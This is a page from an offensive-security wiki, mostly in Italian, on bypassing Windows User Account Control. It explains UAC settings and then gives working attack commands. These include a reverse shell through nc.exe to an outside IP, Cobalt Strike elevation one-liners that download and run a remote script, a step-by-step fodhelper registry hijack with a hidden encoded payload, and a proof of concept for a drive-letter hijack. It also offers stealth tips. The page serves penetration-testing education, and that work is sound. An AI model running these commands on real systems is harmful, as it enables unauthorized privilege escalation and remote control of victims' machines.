# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **prompt di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrity`, e un programma con un **livello high** può eseguire operazioni che **potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e i task vengono sempre **eseguiti nel contesto di sicurezza di un account non amministratore** a meno che un amministratore non autorizzi esplicitamente a queste applicazioni/task l'accesso a livello amministrativo per essere eseguite. È una funzionalità di comodità che protegge gli amministratori da modifiche non intenzionali ma non è considerata un confine di sicurezza.

Per maggiori informazioni sui livelli di integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono forniti 2 token: uno standard, per eseguire azioni regolari a livello normale, e uno con i privilegi admin.

Questa [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute come funziona UAC in grande dettaglio e include il processo di logon, l'esperienza utente e l'architettura di UAC. Gli amministratori possono usare le security policies per configurare come UAC funziona specificamente per la loro organizzazione a livello locale (usando secpol.msc), o configurarlo e distribuirlo tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Group Policy che possono essere impostate per UAC. La tabella seguente fornisce dettagli aggiuntivi:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Alcuni programmi sono **autoelevated automaticamente** se **l'utente appartiene** al **gruppo administrators**. Questi binari hanno nei loro _**Manifest**_ l'opzione _**autoElevate**_ con valore _**True**_. Il binario deve anche essere **signed by Microsoft**.

Molti processi auto-elevati espongono **funzionalità via COM objects o RPC servers**, che possono essere invocati da processi in esecuzione con medium integrity (privilegi a livello utente normale). Nota che COM (Component Object Model) e RPC (Remote Procedure Call) sono metodi che i programmi Windows usano per comunicare ed eseguire funzioni tra processi diversi. Per esempio, **`IFileOperation COM object`** è progettato per gestire operazioni sui file (copia, cancellazione, spostamento) e può elevare automaticamente i privilegi senza un prompt.

Nota che potrebbero essere eseguiti alcuni controlli, come verificare se il processo è stato eseguito dalla **System32 directory**, che può essere bypassato per esempio **iniettando in explorer.exe** o un altro eseguibile localizzato in System32.

Un altro modo per bypassare questi controlli è **modificare la PEB**. Ogni processo in Windows ha un Process Environment Block (PEB), che include dati importanti sul processo, come il suo percorso eseguibile. Modificando la PEB, un attacker può falsificare (spoof) la posizione del proprio processo malevolo, facendolo apparire in esecuzione da una directory attendibile (come system32). Questa informazione falsificata inganna il COM object inducendolo ad auto-elevare i privilegi senza mostrare il prompt all'utente.

Poi, per **bypassare** la **UAC** (elevare da livello **medium** a **high**) alcuni attacker usano questi tipi di binari per **eseguire codice arbitrario** perché verrà eseguito da un processo con **High level integrity**.

Puoi **controllare** il _**Manifest**_ di un binario usando lo strumento _**sigcheck.exe**_ di Sysinternals. (`sigcheck.exe -m <file>`) E puoi **visualizzare** il **livello di integrity** dei processi usando _Process Explorer_ o _Process Monitor_ (di Sysinternals).

### Check UAC

Per confermare se UAC è abilitato esegui:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se è **`1`** allora UAC è **attivato**, se è **`0`** o non esiste, allora UAC è **disattivato**.

Poi, controlla **quale livello** è configurato:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** allora, UAC non chiederà (come **disabilitato**)
- If **`1`** all'amministratore viene **chiesto username e password** per eseguire il binario con permessi elevati (su Secure Desktop)
- If **`2`** (**Notifica sempre**) UAC chiederà sempre conferma all'amministratore quando prova a eseguire qualcosa con privilegi elevati (su Secure Desktop)
- If **`3`** come `1` ma non necessario su Secure Desktop
- If **`4`** come `2` ma non necessario su Secure Desktop
- if **`5`**(**default**) chiederà all'amministratore di confermare l'esecuzione di binari non Windows con privilegi elevati

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(predefinito), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Riepilogo

- If `EnableLUA=0` or **non esiste**, **nessun UAC per nessuno**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , nessun UAC per nessuno**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, nessun UAC per RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC per tutti**

Tutte queste informazioni possono essere raccolte usando il modulo **metasploit**: `post/windows/gather/win_privs`

Puoi anche verificare i gruppi del tuo utente e ottenere il livello di integrità:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Nota che se hai accesso grafico alla vittima, UAC bypass è semplice poiché puoi semplicemente cliccare su "Sì" quando appare la richiesta UAC

L'UAC bypass è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media, e il tuo utente appartiene al gruppo administrators**.

È importante menzionare che è **molto più difficile bypassare l'UAC se è impostato al livello di sicurezza più alto (Always) rispetto a qualunque altro livello (Default).**

### UAC disabilitato

Se l'UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**) puoi **eseguire una reverse shell con privilegi admin** (livello di integrità alto) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** Basic UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente membro del Administrators group puoi **mount the C$** shared via SMB (file system) localmente come un nuovo disco e avrai **access to everything inside the file system** (even Administrator home folder).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al massimo livello di sicurezza
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno anche diversi moduli per il **bypass** della **UAC**.

### KRBUACBypass

Documentazione e tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)che è una **compilation** di diversi UAC bypass exploits. Nota che dovrai **compilare UACME usando visual studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`) , dovrai sapere **quale ti serve.**\
Dovresti **fare attenzione** perché alcuni bypasses faranno comparire prompt in altri programmi che avviseranno l'**utente** che qualcosa sta succedendo.

UACME indica la **versione di build da cui ogni tecnica ha cominciato a funzionare**. Puoi cercare una tecnica che interessi le tue versioni:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) ottieni la release di Windows `1607` dalle build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binario affidabile `fodhelper.exe` viene elevato automaticamente nelle versioni moderne di Windows. All'avvio, interroga il percorso di registro per utente riportato di seguito senza validare il verbo `DelegateExecute`. Piantare un comando lì permette a un processo con Medium Integrity (l'utente è negli Administrators) di avviare un processo con High Integrity senza un prompt UAC.

Percorso del registro interrogato da fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Passaggi PowerShell (imposta il tuo payload, poi trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Note:
- Funziona quando l'utente corrente è membro del gruppo Administrators e il livello UAC è predefinito/permessivo (non "Always Notify" con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare una PowerShell a 64-bit da un processo a 32-bit su Windows a 64-bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o il percorso di un EXE). Evita UI che richiedono prompt per maggiore stealth.

#### More UAC bypass

**Tutte** le tecniche usate qui per bypassare AUC **richiedono** una **shell interattiva completa** con la vittima (una comune shell nc.exe non è sufficiente).

Puoi ottenerla usando una sessione **meterpreter**. Migra in un **processo** che ha il valore **Session** uguale a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass with GUI

Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando lo ricevi, non hai realmente bisogno di un bypass. Quindi ottenere accesso a una GUI ti permetterà di bypassare UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente via RDP) ci sono **alcuni strumenti che gireranno come administrator** da cui potresti **lanciare** un **cmd** per esempio **as admin** direttamente senza essere nuovamente richiesto da UAC, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### Noisy brute-force UAC bypass

Se non ti importa di essere rumoroso, puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi finché l'utente non accetta**.

### Your own bypass - Basic UAC bypass methodology

Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo la dll malevola in _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binario che si **autoelevi** (verifica che quando viene eseguito funzioni a un livello di integrità elevato).
2. Con procmon trova eventi "**NAME NOT FOUND**" che possono essere vulnerabili a **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL in alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB in percorsi protetti (perché questo strumento viene eseguito a livello di integrità elevato).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binario vulnerabile e autoelevato.

### Another UAC bypass technique

Consiste nell'osservare se un **autoElevated binary** prova a **leggere** dal **registry** il **nome/percorso** di un **binary** o **command** da **eseguire** (questo è più interessante se il binario cerca queste informazioni all'interno di **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens con mappe per-sessione `\Sessions\0\DosDevices/<LUID>`. La directory viene creata in modo lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona il token shadow-admin solo a livello di **SecurityIdentification**, la directory viene creata con l'attaccante come **owner** (eredita `CREATOR OWNER`), permettendo link a lettera di unità che prendono priorità su `\GLOBAL??`.

**Steps:**

1. Da una sessione a basso privilegio, chiama `RAiProcessRunOnce` per spawnare uno `runonce.exe` shadow-admin senza prompt.
2. Duplica il suo token primario in un token di **identification** e impersonalo mentre apri `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` sotto la proprietà dell'attaccante.
3. Crea lì un symlink `C:` che punti a uno storage controllato dall'attaccante; gli accessi al filesystem in quella sessione risolvono `C:` nel percorso dell'attaccante, permettendo DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Riferimenti
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Come funziona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – raccolta di tecniche di UAC bypass](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
